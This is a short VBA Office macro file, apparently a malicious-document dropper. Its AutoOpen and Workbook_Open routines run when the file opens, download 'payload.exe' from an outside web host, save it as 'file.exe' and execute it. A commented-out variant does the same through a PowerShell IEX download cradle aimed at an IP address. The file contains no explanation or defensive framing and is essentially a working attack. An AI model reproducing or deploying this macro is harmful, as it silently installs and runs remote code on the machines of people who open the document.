
'xHttp.Open "GET", "http://cs.unk.edu/~millermj/payload.exe", False
'Sub Auto_Open()
'
' Auto_Open Macro
'
'
'Dim exec As String
'exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://144.216.127.132:8000/payload.txt'))"""
'Shell (exec)

Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "http://cs.unk.edu/~millermj/payload.exe", False
xHttp.Send

With bStrm
 .Type = 1 '//binary
 .Open
 .write xHttp.responseBody
 .savetofile "file.exe", 2 '//overwrite
End With

Shell ("file.exe")

End Sub
'
'End Sub
'Sub AutoOpen()
'Auto_Open
'End Sub
Sub Workbook_Open()
Auto_Open
End Sub
